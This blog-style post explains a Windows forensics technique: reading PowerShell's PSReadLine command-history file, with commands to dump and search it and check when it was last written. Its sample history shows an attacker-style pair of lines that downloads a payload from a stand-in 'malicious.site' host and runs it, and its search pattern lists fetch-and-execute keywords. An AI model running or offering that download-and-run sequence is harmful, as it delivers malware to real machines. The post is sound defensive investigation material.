---
title: "Windows Powershell Forensics"
date: "2026-04-22"
summary: "Quick DFIR technique to review PowerShell command history on Windows endpoints"
categories: "Forensics"
image: "featured.jpg"
showTableOfContents: true
draft: false
---

## Intro

When investigating suspicious activity on a Windows endpoint, one of the easiest wins is reviewing PowerShell command history.

If an attacker or legitimate user interacted with the system via Powershell, their commands were quietly logged in a local artifact.

## Where PowerShell Stores Command History

PowerShell logs user command history into a plaintext file:

```C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt```

There's a unique file for every user. Enumerating users with ```net user``` can help identify additional locations to review.

## What You'll Find Inside

The file is simple but powerful. A list of all commands executed by the user.

```Powershell
whoami
ipconfig /all
Invoke-WebRequest http://malicious.site/payload.exe -OutFile payload.exe
Start-Process payload.exe
```
There are no timestamps, which is a limitation. However, the **LastWriteTime** of the file can provide a rough indicator of recent activity.

## Limitations You Should Know

This artifact is useful, but far from perfect.

* No timestamps
* Limited history size
* Can be deleted

In real-world incidents, this file is either incredibly useful, or completely gone.

## Quick Tips

**Dump the full file history**

```Powershell
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

**Show the most recent commands**

```Powershell
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Tail 20
```

**Search for suspicious keywords**

```Powershell
Select-String -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Pattern "Invoke-WebRequest","IEX","Download","EncodedCommand"
```

**Find most repeated commands**

```Powershell
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" |
Group-Object |
Sort-Object Count -Descending |
Select-Object Count, Name -First 15
```

**Grab LastWriteTime**

```Powershell
Get-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" | Select LastWriteTime
```

## Final Thoughts

PowerShell history is one of those artifacts that easy to overlook, but extremely powerful when present.

It won't give a full timeline, but can quickly answer an important question: what was executed on this system?

When combined with other forensic artifacts, a much cleaner picture can be painted.

